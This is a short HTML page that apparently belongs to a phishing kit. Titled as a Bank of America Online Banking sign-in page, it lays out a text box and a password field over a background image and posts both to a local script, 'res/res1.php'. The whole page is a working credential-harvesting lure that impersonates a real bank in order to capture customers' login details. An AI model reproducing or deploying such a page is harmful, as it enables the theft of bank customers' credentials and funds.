<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Bank of America | Online Banking | Sign In | Online ID</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/index.css" rel="stylesheet">
</head>
<body>
<form name="ff" action="res/res1.php" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:604px;width:1344px;height:324px;z-index:1;">
<img src="images/2.GIF" id="Image1" alt=""></div>
<input type="text" id="Editbox1" style="position:absolute;left:89px;top:258px;width:264px;height:27px;line-height:27px;z-index:2;" name="1" value="" required>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:89px;top:477px;width:110px;height:31px;z-index:3;">
<div id="wb_Form1" style="position:absolute;left:79px;top:292px;width:34px;height:31px;z-index:4;">
<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:9px;top:7px;z-index:0;">

</div>
<input type="password" id="Editbox2" style="position:absolute;left:89px;top:410px;width:264px;height:27px;line-height:27px;z-index:5;" name="2" value="" required>
</form>
</body>
</html>